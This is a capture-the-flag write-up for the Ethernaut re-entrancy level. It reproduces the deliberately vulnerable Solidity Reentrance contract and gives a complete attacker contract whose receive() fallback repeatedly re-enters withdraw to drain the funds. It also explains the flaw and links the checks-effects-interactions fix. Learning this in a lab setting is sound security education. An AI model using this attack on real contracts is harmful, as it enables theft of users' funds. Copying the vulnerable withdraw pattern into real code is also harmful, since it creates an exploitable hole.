# Re-entrancy 🔄

Tenth Challenge description is as follows:

The goal of this level is for you to steal all the funds from the contract.

Things that might help:

- Untrusted contracts can execute code where you least expect it.
- Fallback methods
- Throw/revert bubbling
- Sometimes the best way to attack a contract is with another contract.
- See the Help page above, section "Beyond the console"
Code:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

```

### Resolution
The goal of the level is to completely drain the contract. This level give us A LOT of hints of what's going on, and portraits one of the most popular vulnerabilities in Solidity: The Re-entrancy attack.

There's plenty of documentation online about re-entrancy vulnerability, I recommend having a good read to understand all the intricacies of calling an external untrusted contract before modifying state variables of our contract. But in a nutshell, the vulnerability is exploited when a contract calls something outside of the scope of the contract (another contract) and this external contract before updating state variables (common case, before updating user balances), and in this external contract, there's a fallback function to actually call back the original contract function "re-entering" into the contract on a loop until some condition is met.

Let's use the `Reentrance` contract to illustrate what you just read:

- 1) Contract `Reentrance` has a function `withdrawal` that makes an external call: `msg.sender.call{value:_amount}("");`
- 2) This `msg.sender` could be another contract with a `receive` or `fallback` function defined that calls back again (re-enter) the `Reentrance` contract calling `withdraw` again.
- 3) Now suppose, this contract has a balance on the `Reentrance` contract, because the external call is made BEFORE the balances update, this contract could be drained by exploiting this vulnerability!

Let's deploy an attack contract to try to exploit it:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

// Interface of Reentrant contract to make it easier on the code
interface IReentrancy {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract AttackReentrancy__Ethernaut {

    // Reentrant contract
    IReentrancy public reentrance;
    
    // Amount to donate and subsequentally withdraw
    uint private amountToSend;

    // Constructor: Pass the instance contract address and some ETH 
    constructor(address reentrancyContractAddr) public payable {
        reentrance = IReentrancy(reentrancyContractAddr);
        amountToSend = msg.value;
    }

    // Execute donate first
    function donateToReentrant() public payable {
        reentrance.donate{ value: amountToSend }(address(this));
    }

    // Execute withdraw on reentrance -> will end up calling receive()
    function executeWithdrawalOnVictim() public {
      reentrance.withdraw(amountToSend);
    }

    // Method that will execute in the Reentrant
    receive() external payable {
        if (address(reentrance).balance > 0)  {
          reentrance.withdraw(amountToSend);
        }
    }
}

```

Deploy the contract, call donate, then withdrawal and drain the `Reentrance` contract! 💥 

More on how to avoid and Checks-Effects-Interaction Pattern [here](https://docs.soliditylang.org/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern)

## License

[MIT](https://choosealicense.com/licenses/mit/)